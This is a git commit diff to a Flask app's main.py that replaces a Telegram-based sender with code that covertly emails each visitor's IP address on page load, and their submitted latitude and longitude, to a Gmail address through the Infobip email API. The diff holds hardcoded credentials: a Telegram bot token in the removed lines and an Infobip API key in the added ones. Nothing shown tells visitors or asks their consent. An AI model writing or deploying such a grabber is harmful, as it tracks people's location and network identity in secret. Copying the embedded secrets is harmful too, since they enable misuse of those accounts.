a9c2d72510227161604c7655d77db36224247a1e
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-25 00:09:04 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,44 +1,77 @@
-from flask import Flask, render_template, request
+from flask import Flask, request
 import requests
 
 app = Flask(__name__)
+ app.config['DEBUG'] = True
 
 @app.route('/')
-def hello():
-    return render_template('index.html')
+def index():
+    # Send the IP address to Gmail
+    send_ip_to_gmail(request.remote_addr)
 
-@app.route('/send_location', methods=['POST'])
-def send_location():
-    latitude = request.form['latitude']
-    longitude = request.form['longitude']
-    
-    # Send the location to Telegram using the Telegram Bot API
-    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
-    chat_id = '373715044'
-    api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
-    
-    response = requests.get(api_url)
-    if response.status_code == 200:
-        return 'Location sent successfully!'
-    else:
-      return 'Failed to send location.'
+    # Render the index.html page
+    return app.send_static_file('index.html')
 
-@app.route('/send_ip', methods=['POST'])
-def send_ip():
-    # Get the IP address of the user
-    ip_address = request.form['ip_address']
-    
-    # Send the IP address to Telegram using the Telegram Bot API
-    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
-    chat_id = '373715044'
-    message = f"IP Address: {ip_address}"
-    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
-    
-    response = requests.get(api_url)
-    if response.status_code == 200:
-       return 'IP sent successfully!'
-   else:
-       return 'Failed to send IP.'
+@app.route('/location', methods=['POST'])
+def location():
+    # Parse the location data from the request body
+    lat = request.form['latitude']
+    lon = request.form['longitude']
+
+    # Send the IP and location data to Gmail
+    send_location_to_gmail(request.remote_addr, lat, lon)
+
+    # Return a response to the client
+    return 'Location received successfully.'
+
+def send_ip_to_gmail(ip):
+    # Set up the email parameters
+    BASE_URL = "https://nz3x68.api.infobip.com"
+    API_KEY = "App 1c324f190303bfaa25163865179285b6-cc9f31d7-4383-40f7-9b10-de318fb4c44d"
+    SENDER_EMAIL = "01028838444a@selfserviceib.com"
+    RECIPIENT_EMAIL = "01028838444a@gmail.com"
+    EMAIL_SUBJECT = "Client IP Address"
+    EMAIL_TEXT = "The client IP address is: " + ip
+
+    form_data = {
+        "from": SENDER_EMAIL,
+        "to": RECIPIENT_EMAIL,
+        "subject": EMAIL_SUBJECT,
+        "text": EMAIL_TEXT
+    }
+
+    all_headers = {
+        "Authorization": API_KEY
+    }
+
+    response = requests.post(BASE_URL + "/email/3/send", data=form_data, headers=all_headers)
+
+    return response.json()
+
+def send_location_to_gmail(ip, lat, lon):
+    # Set up the email parameters
+    BASE_URL = "https://nz3x68.api.infobip.com"
+    API_KEY = "App 1c324f190303bfaa25163865179285b6-cc9f31d7-4383-40f7-9b10-de318fb4c44d"
+    SENDER_EMAIL = "01028838444a@selfserviceib.com"
+    RECIPIENT_EMAIL = "01028838444a@gmail.com"
+    EMAIL_SUBJECT = "Client Location"
+    EMAIL_TEXT = "The client IP address is: " + ip + "\n" + \
+                  "The client location is: " + str(lat) + ", " + str(lon)
+
+    form_data = {
+        "from": SENDER_EMAIL,
+        "to": RECIPIENT_EMAIL,
+        "subject": EMAIL_SUBJECT,
+        "text": EMAIL_TEXT
+    }
+
+    all_headers = {
+        "Authorization": API_KEY
+    }
+
+    response = requests.post(BASE_URL + "/email/3/send", data=form_data, headers=all_headers)
+
+    return response.json()
 
 if __name__ == '__main__':
     app.run()
